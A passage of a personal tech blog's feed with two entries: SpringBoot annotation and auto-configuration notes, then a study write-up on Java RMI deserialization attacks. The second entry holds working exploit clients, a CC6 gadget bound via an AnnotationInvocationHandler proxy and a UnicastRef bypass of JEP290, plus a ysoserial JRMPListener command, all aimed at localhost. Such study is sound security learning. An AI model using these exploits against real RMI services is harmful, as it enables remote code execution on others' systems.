    <category term="wp" scheme="https://xianbeil.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>springboot学习笔记-基础，自动配置与开发插件</title>
    <link href="https://xianbeil.github.io/2022/05/11/springboot-web%E5%AD%A6%E4%B9%A001/"/>
    <id>https://xianbeil.github.io/2022/05/11/springboot-web%E5%AD%A6%E4%B9%A001/</id>
    <published>2022-05-11T14:05:42.000Z</published>
    <updated>2022-05-11T15:17:06.601Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>感觉学这种框架开发还是要经常写博客记录一些问题，自己的博客嘛，反正是菜鸡也不建议乱一点hhh</p><p>spring文档：<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/index.html">https://docs.spring.io/spring-boot/docs/current/reference/html/index.html</a></p><p>spring，springmvc，springboot的一些知识：<a href="https://www.yijiyong.com/spring/basic/01-intro.html">https://www.yijiyong.com/spring/basic/01-intro.html</a></p><h1 id="底层注解"><a href="#底层注解" class="headerlink" title="底层注解"></a>底层注解</h1><blockquote><p>一些常见的底层注解</p></blockquote><h1 id="自动引导配置"><a href="#自动引导配置" class="headerlink" title="自动引导配置"></a>自动引导配置</h1><h2 id="SpringBootApplication"><a href="#SpringBootApplication" class="headerlink" title="@SpringBootApplication"></a>@SpringBootApplication</h2><p>@SpringBootApplication<br>等同于<br>@SpringBootConfiguration<br>@EnableAutoConfiguration<br>@ComponentScan(“com.atguigu.boot”)</p><h1 id="组件添加"><a href="#组件添加" class="headerlink" title="组件添加"></a>组件添加</h1><h2 id="Configuration"><a href="#Configuration" class="headerlink" title="@Configuration"></a>@Configuration</h2><p>@Configuration(proxyBeanMethods &#x3D; false) &#x2F;&#x2F;告诉SpringBoot这是一个配置类 &#x3D;&#x3D; 配置文件</p><ul><li>1、配置类里面使用@Bean标注在方法上给容器注册组件，默认也是单实例的</li><li>2、配置类本身也是组件</li><li>3、proxyBeanMethods：代理bean的方法</li><li>Full(proxyBeanMethods &#x3D; true)、【保证每个@Bean方法被调用多少次返回的组件都是单实例的】</li><li>Lite(proxyBeanMethods &#x3D; false)【每个@Bean方法被调用多少次返回的组件都是新创建的】</li><li>组件依赖必须使用Full模式默认。其他默认是否Lite模式</li></ul><h2 id="Bean"><a href="#Bean" class="headerlink" title="@Bean"></a>@Bean</h2><p>注册组件：自己编写Config类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration(<span class="params">proxyBeanMethods = false</span>)</span></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">MyConfig</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">    @Bean</span></span><br><span class="line">    public Car car01()&#123;</span><br><span class="line">        Car car = new Car(<span class="string">&quot;benz&quot;</span>,<span class="number">1000000000</span>);</span><br><span class="line">        <span class="keyword">return</span> car;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="meta">    @Bean(<span class="params"><span class="string">&quot;User001&quot;</span></span>)</span></span><br><span class="line">    public User user01()&#123;</span><br><span class="line">        User user = new User(<span class="string">&quot;Tom&quot;</span>,<span class="number">20</span>);</span><br><span class="line">        user.setPet(new Pet(<span class="string">&quot;zhutousan&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">MainApplication</span> &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //返回IOC容器</span><br><span class="line">        ConfigurableApplicationContext run = SpringApplication.run(MainApplication.<span class="keyword">class</span>, args);</span><br><span class="line"></span><br><span class="line">        //从容器中获得组件</span><br><span class="line">        User user001 = run.getBean(<span class="string">&quot;User001&quot;</span>, User.<span class="keyword">class</span>);</span><br><span class="line">        System.out.println(user001.getPet());</span><br><span class="line"></span><br><span class="line">        //获取Config组件</span><br><span class="line">        MyConfig config = run.getBean( MyConfig.<span class="keyword">class</span>);</span><br><span class="line">        Car car = config.car01();</span><br><span class="line"></span><br><span class="line">        System.out.println(car);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Import、-ComponentScan"><a href="#Import、-ComponentScan" class="headerlink" title="@Import、@ComponentScan"></a>@Import、@ComponentScan</h2><p>@Import({User.class, DBHelper.class})<br>@Configuration(proxyBeanMethods &#x3D; false) &#x2F;&#x2F;告诉SpringBoot这是一个配置类 &#x3D;&#x3D; 配置文件<br>public class MyConfig {<br>}</p><h2 id="Conditional"><a href="#Conditional" class="headerlink" title="@Conditional"></a>@Conditional</h2><p>条件装配：满足Conditional指定的条件，则进行组件注入</p><p>@Import({User.class, DBHelper.class})<br>     给容器中自动创建出这两个类型的组件、默认组件的名字就是全类名</p><p>@ConditionalOnBean(name &#x3D; “tom”)<br>@ConditionalOnMissingBean(name &#x3D; “tom”)</p><h1 id="原生配置文件导入"><a href="#原生配置文件导入" class="headerlink" title="原生配置文件导入"></a>原生配置文件导入</h1><h2 id="ImportResource"><a href="#ImportResource" class="headerlink" title="@ImportResource"></a>@ImportResource</h2><p>支持原生配置文件</p><p>@ImportResource(“classpath:beans.xml”)</p><p>beans.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">======================beans.xml=========================</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;haha&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.boot.bean.User&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;zhangsan&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;18&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hehe&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.boot.bean.Pet&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;tomcat&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="配置绑定"><a href="#配置绑定" class="headerlink" title="配置绑定"></a>配置绑定</h1><h2 id="ConfigurationProperties"><a href="#ConfigurationProperties" class="headerlink" title="@ConfigurationProperties"></a>@ConfigurationProperties</h2><p>只有在容器中的组件，才会拥有SpringBoot提供的强大功能<br>@Component<br>@ConfigurationProperties(prefix &#x3D; “mycar”)</p><h2 id="EnableConfigurationProperties"><a href="#EnableConfigurationProperties" class="headerlink" title="@EnableConfigurationProperties"></a>@EnableConfigurationProperties</h2><p>@EnableConfigurationProperties(Car.class)<br>&#x2F;&#x2F;1、开启Car配置绑定功能<br>&#x2F;&#x2F;2、把这个Car这个组件自动注册到容器中</p><h1 id="自动配置原理"><a href="#自动配置原理" class="headerlink" title="自动配置原理"></a>自动配置原理</h1><h1 id="SpringBootApplication-1"><a href="#SpringBootApplication-1" class="headerlink" title="@SpringBootApplication"></a>@SpringBootApplication</h1><p>Springboot的启动项：</p><p>这是一个合成注解，由</p><p>@SpringBootConfiguration<br>@EnableAutoConfiguration<br>@ComponentScan</p><p>合成而来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br></pre></td></tr></table></figure><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510083913-l8tah3s.png" alt="image.png"></p><h2 id="SpringBootConfiguration"><a href="#SpringBootConfiguration" class="headerlink" title="@SpringBootConfiguration"></a>@SpringBootConfiguration</h2><p>@Configuration表明他是一个config类</p><p>因此其实我们的主启动类MainAppliciation也是一个配置类</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510083932-3sui9xn.png" alt="image.png"></p><p>因此这样也是可以的</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510084220-2x8uzs8.png" alt="image.png"></p><h2 id="EnableAutoConfiguration"><a href="#EnableAutoConfiguration" class="headerlink" title="@EnableAutoConfiguration"></a>@EnableAutoConfiguration</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AutoConfigurationPackage</span></span><br><span class="line"><span class="meta">@Import(&#123;AutoConfigurationImportSelector.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> EnableAutoConfiguration &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">ENABLED_OVERRIDE_PROPERTY</span> <span class="operator">=</span> <span class="string">&quot;spring.boot.enableautoconfiguration&quot;</span>;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt;[] exclude() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    String[] excludeName() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分别跟进</p><h3 id="AutoConfigurationPackage"><a href="#AutoConfigurationPackage" class="headerlink" title="@AutoConfigurationPackage"></a>@AutoConfigurationPackage</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Import(&#123;Registrar.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> AutoConfigurationPackage &#123;</span><br><span class="line">    String[] basePackages() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt;[] basePackageClasses() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里导入了<code>org.springframework.boot.autoconfigure.AutoConfigurationPackages.Registrar</code>类</p><p>在这个方法打上断点，在这里批量注册组件</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510085037-90mq1uf.png" alt="image.png"></p><p>metadata封装了注解的元信息，可以看到注解中的信息被封装在<code>com.xianbei.boot.MainApplication</code>中</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510090008-8rhogtr.png" alt="image.png"></p><p><code>(new AutoConfigurationPackages.PackageImports(metadata)).getPackageNames()</code>的结果就是我们的包名</p><p>这个包名也是对应了上面注解封装类的包</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510090041-hcsmcis.png" alt="image.png"></p><p>因此这里就是自动将<code>com.xianbei.boot</code>包下的组件注册到容器中去</p><h3 id="Import-AutoConfigurationImportSelector-class"><a href="#Import-AutoConfigurationImportSelector-class" class="headerlink" title="@Import({AutoConfigurationImportSelector.class})"></a>@Import({AutoConfigurationImportSelector.class})</h3><p><code>org.springframework.boot.autoconfigure.AutoConfigurationImportSelector#selectImports</code>方法返回一个数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] selectImports(AnnotationMetadata annotationMetadata) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.isEnabled(annotationMetadata)) &#123;</span><br><span class="line">        <span class="keyword">return</span> NO_IMPORTS;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        AutoConfigurationImportSelector.<span class="type">AutoConfigurationEntry</span> <span class="variable">autoConfigurationEntry</span> <span class="operator">=</span> <span class="built_in">this</span>.getAutoConfigurationEntry(annotationMetadata);</span><br><span class="line">        <span class="keyword">return</span> StringUtils.toStringArray(autoConfigurationEntry.getConfigurations());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，跟进getAutoConfigurationEntry方法，并打上断点调试</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510095712-w9caxs1.png" alt="image.png"></p><p>这里的配置项也是写好的，位于spring-boot-autoconfigure-2.6.6.jar\META-INF\spring.factories</p><p>但他实际上还是按需加载类的，这就是基于 springboot 的按条件装配@Conditional，根据规则最终实现按需装配。</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510152132-ytvxw68.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">开始学习springboot啦，感觉学习开发之类的写博客更好</summary>
    
    
    
    <category term="java开发" scheme="https://xianbeil.github.io/categories/java%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="springboot2" scheme="https://xianbeil.github.io/tags/springboot2/"/>
    
  </entry>
  
  <entry>
    <title>RMI反序列化攻击1</title>
    <link href="https://xianbeil.github.io/2022/05/03/rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961/"/>
    <id>https://xianbeil.github.io/2022/05/03/rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961/</id>
    <published>2022-05-03T15:23:03.000Z</published>
    <updated>2022-05-03T15:23:53.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>互打</p><h1 id="Client攻击Server"><a href="#Client攻击Server" class="headerlink" title="Client攻击Server"></a>Client攻击Server</h1><h2 id="恶意参数"><a href="#恶意参数" class="headerlink" title="恶意参数"></a>恶意参数</h2><blockquote><p>Server 端的调用方法存在非基础类型的参数时，就可以被恶意 Client 端传入恶意数据流触发反序列化漏洞。</p></blockquote><h3 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h3><p>调试节有提过，<code>sun.rmi.server.UnicastRef#unmarshalValue</code></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502091703-okmgwij.png" alt="image.png"></p><h3 id="Object参数"><a href="#Object参数" class="headerlink" title="Object参数"></a>Object参数</h3><p>Server上的远程对象的参数有Object类型，Client就可以传恶意序列化数据过去，Server接收的时候会反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getObj</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502091214-xlahr1v.png" alt="image.png"></p><p>如果参数类型不为Object，也可以通过以下方法来绕过</p><ul><li><a href="https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg">通过网络代理，在流量层修改数据</a></li><li>自定义 “java.rmi” 包的代码，自行实现</li><li><a href="https://www.anquanke.com/post/id/200860">字节码修改</a></li><li>使用 debugger</li></ul><h1 id="Server攻击Registry"><a href="#Server攻击Registry" class="headerlink" title="Server攻击Registry"></a>Server攻击Registry</h1><h2 id="攻击bind-amp-rebind方法"><a href="#攻击bind-amp-rebind方法" class="headerlink" title="攻击bind&amp;rebind方法"></a>攻击bind&amp;rebind方法</h2><p>漏洞触发点：<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502203727-qd2t7ui.png" alt="image.png"></p><p>用<code>AnnotationInvocationHandler</code> 来代理 <code>Remote</code> 接口让其能够在bind方法里面被反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.SAR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.exploit.CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadClient2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException, RemoteException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) CC6.getCC6();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用AnnotationInvocationHandler动态代理实现Remote接口</span></span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor AnnotationInvocationHandlerConstructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        AnnotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler o=(InvocationHandler)AnnotationInvocationHandlerConstructor.newInstance(Target.class,map);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">r</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, o));</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            registry.bind(<span class="string">&quot;fuck&quot;</span>,r);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502205044-k75uik6.png" alt="image.png"></p><p>原因是<code>sun.rmi.registry.RegistryImpl#registryFilter</code>里的白名单</p><p><a href="https://xz.aliyun.com/t/10170">JEP290</a>的限制，也就是下面这个补丁之后加入的白名单</p><p><a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5534221c23fc/src/share/classes/sun/rmi/registry/RegistryImpl.java#l388">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5534221c23fc/src/share/classes/sun/rmi/registry/RegistryImpl.java#l388</a></p><blockquote><p>第一次遇到，为之后再详细去看他铺垫</p><p>JEP290 是 Java 底层为了缓解反序列化攻击提出的一种解决方案，描述网址<a href="https://openjdk.java.net/jeps/290">点这里</a>。这是一个针对 JAVA 9 提出的安全特性，但同时对 JDK 6,7,8 都进行了支持，在 JDK 6u141、JDK 7u131、JDK 8u121 版本进行了更新。</p><p>JEP 290 主要提供了几个机制：</p><ul><li>提供了一种灵活的机制，将可反序列化的类从任意类限制为上下文相关的类（黑白名单）；</li><li>限制反序列化的调用深度和复杂度；</li><li>为 RMI export 的对象设置了验证机制；</li><li>提供一个全局过滤器，可以在 properties 或配置文件中进行配置。</li></ul></blockquote><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502225643-pivl6ga.png" alt="image.png"></p><blockquote><p>参考：<a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/">http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/</a></p></blockquote><h2 id="UnicastRef绕过JEP290"><a href="#UnicastRef绕过JEP290" class="headerlink" title="UnicastRef绕过JEP290"></a>UnicastRef绕过JEP290</h2><blockquote><p>bypass这里可以单独整理</p></blockquote><p>用UnicastRef对象新建一个RMI连接绕过JEP290的限制，配合ysoserial中的<a href="https://xz.aliyun.com/t/2650">JRMPListener模块</a></p><p><code>8u121&lt;=jdk&lt;=8u231</code></p><ol><li>用<code>ysoserial</code>启动一个恶意的<code>JRMPListener</code></li><li>启动注册中心</li><li>启动Client调用<code>bind()</code>操作</li><li>注册中心被反序列化攻击</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener <span class="number">3333</span> CommonsCollections5 <span class="string">&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure><p>Client</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CAR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.demo02.IHello;</span><br><span class="line"><span class="keyword">import</span> com.exploit.CC6;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadClient3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">3333</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(IHello.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Server攻击Client"><a href="#Server攻击Client" class="headerlink" 